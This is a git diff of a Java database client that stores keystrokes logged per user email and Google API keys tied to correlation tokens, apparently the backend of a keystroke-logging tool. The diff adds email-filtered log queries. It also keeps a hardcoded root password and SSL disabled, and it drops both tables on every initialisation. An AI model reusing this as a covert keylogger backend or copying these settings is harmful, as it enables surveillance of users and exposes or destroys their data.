@@ -1,4 +1,3 @@
-import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.DaoManager;
 import com.j256.ormlite.jdbc.JdbcConnectionSource;
 import com.j256.ormlite.table.TableUtils;
@@ -21,7 +20,8 @@ public class DatabaseClient {
                             "password=root&" +
                             "useJDBCCompliantTimezoneShift=true&" +
                             "useLegacyDatetimeCode=false&" +
-                            "serverTimezone=UTC" +
+                            "serverTimezone=UTC&" +
+                            "allowPublicKeyRetrieval=true"+
                             "&useSSL=false"
             );
         } catch (SQLException ex) {
@@ -32,15 +32,44 @@ public class DatabaseClient {
         }
     }
 
+
+    public List<KeyLogsEntry> GetLogs(String email) {
+        List<KeyLogsEntry> logs = new ArrayList<>();
+        try {
+            var connection = this.GetConnectionSource();
+            var accountDao = DaoManager.createDao(connection, KeyLogsEntry.class);
+
+            var qb = accountDao.queryBuilder();
+
+            var q = qb.orderBy("TimeStamp", false)
+                    .limit(100L)
+                    .where()
+                    .eq("UserEmail", email)
+                    .prepare();
+            accountDao.query(q).forEach(logs::add);
+
+            connection.close();
+        } catch (SQLException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return logs;
+    }
+
+
     public List<KeyLogsEntry> GetLogs() {
         List<KeyLogsEntry> logs = new ArrayList<>();
         try {
             var connection = this.GetConnectionSource();
-            Dao<KeyLogsEntry, String> accountDao =
-                    DaoManager.createDao(connection, KeyLogsEntry.class);
+            var accountDao = DaoManager.createDao(connection, KeyLogsEntry.class);
 
-            accountDao.forEach(logs::add);
+            var qb = accountDao.queryBuilder();
 
+            var q = qb.orderBy("TimeStamp", false)
+                    .limit(100L)
+                    .prepare();
+            accountDao.query(q).forEach(logs::add);
             connection.close();
         } catch (SQLException e) {
             e.printStackTrace();
@@ -57,7 +86,7 @@ public class DatabaseClient {
             var dao = DaoManager.createDao(connection, CorelationTokenEntry.class);
 
             var entry = new CorelationTokenEntry();
-            entry.CorelationToken = corelationToken;
+            entry.CorrelationToken = corelationToken;
             entry.GoogleApiKey = googleApiKey;
 
             dao.create(entry);
@@ -73,10 +102,9 @@ public class DatabaseClient {
         try {
             var connection = this.GetConnectionSource();
             var dao = DaoManager.createDao(connection, CorelationTokenEntry.class);
-            var token = dao.queryForEq("CorelationToken", corelationToken).stream().sorted(Comparator.comparing(c -> c.Id)).findFirst().orElse(null);
+            var token = dao.queryForEq("CorrelationToken", corelationToken).stream().sorted(Comparator.comparing(c -> c.Id)).findFirst().orElse(null);
             connection.close();
-            if(token != null)
-            {
+            if (token != null) {
                 return token.GoogleApiKey;
             }
         } catch (SQLException e) {
@@ -87,7 +115,7 @@ public class DatabaseClient {
         return null;
     }
 
-    public void LogUserKeyPress(String email, String key) {
+    public void LogUserKeyPress(String email, String key, Date d) {
         try {
             var connection = this.GetConnectionSource();
             var dao = DaoManager.createDao(connection, KeyLogsEntry.class);
@@ -95,7 +123,7 @@ public class DatabaseClient {
             var entry = new KeyLogsEntry();
             entry.UserEmail = email;
             entry.Key = key;
-            entry.TimeStamp = new Timestamp(new Date().getTime());
+            entry.TimeStamp = d;
 
             dao.create(entry);
             connection.close();
@@ -110,7 +138,9 @@ public class DatabaseClient {
     public void Initialize() {
         try {
             var conn = this.GetConnectionSource();
+            TableUtils.dropTable(conn, KeyLogsEntry.class, true);
             TableUtils.createTableIfNotExists(conn, KeyLogsEntry.class);
+            TableUtils.dropTable(conn, CorelationTokenEntry.class, true);
             TableUtils.createTableIfNotExists(conn, CorelationTokenEntry.class);
             conn.close();
         } catch (SQLException ex) {
